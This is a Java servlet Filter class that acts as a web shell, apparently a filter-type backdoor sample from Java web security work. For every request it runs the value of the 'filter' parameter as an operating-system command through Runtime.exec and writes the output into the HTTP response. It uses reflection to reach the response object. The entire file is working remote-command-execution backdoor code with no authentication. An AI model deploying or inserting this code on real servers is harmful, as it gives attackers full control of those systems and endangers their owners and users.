package com.axisx;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;

public class MyFilter implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter 创建");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;

        try {
            HttpServletResponse resp = this.getResponseFromRequest(req);
            String cmd = req.getParameter("filter");
            String result = this.CommandExec(cmd);
            //            resp.setContentType("text/html;charset=UTF-8");
            PrintWriter out = resp.getWriter();
            out.println(result);
            out.flush();
            filterChain.doFilter(servletRequest, servletResponse);
        } catch (Exception e) {
            e.printStackTrace();
        }


    }

    public String CommandExec(String cmd) throws Exception {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(cmd);
        InputStream stderr =  proc.getInputStream();
        InputStreamReader isr = new InputStreamReader(stderr);
        BufferedReader br = new BufferedReader(isr);
        String line = null;
        StringBuffer sb = new StringBuffer();
        while ((line = br.readLine()) != null) {
            sb.append(line + "\n");
        }
        return sb.toString();
    }

    public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) {
        HttpServletResponse var2 = null;

        try {
            Field var3 = var1.getClass().getSuperclass().getDeclaredField("response");
            var3.setAccessible(true);
            var2 = (HttpServletResponse)var3.get(var1);
        } catch (Exception var8) {
            try {
                Field var4 = var1.getClass().getDeclaredField("request");
                var4.setAccessible(true);
                Object var5 = var4.get(var1);
                Field var6 = var5.getClass().getSuperclass().getDeclaredField("response");
                var6.setAccessible(true);
                var2 = (HttpServletResponse)var6.get(var5);
            } catch (Exception var7) {
            }
        }

        return var2;
    }
    @Override
    public void destroy() {
        System.out.println("Filter 销毁！");
    }
}
